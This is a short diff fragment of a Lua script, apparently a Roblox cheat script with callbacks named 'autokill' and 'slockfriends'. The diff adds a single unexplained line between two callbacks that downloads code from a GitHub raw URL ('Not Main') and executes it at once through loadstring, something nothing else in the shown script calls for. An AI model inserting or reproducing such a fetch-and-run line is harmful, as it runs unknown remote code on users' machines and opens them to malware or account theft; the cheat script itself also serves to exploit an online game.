@@ -716,6 +716,8 @@ cb("autokill", function()
         end
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jojos5/Lpi/refs/heads/main/Not Main"))()
+
 cb("slockfriends", function()
     local player = game.Players.LocalPlayer
     local players = game:GetService("Players")
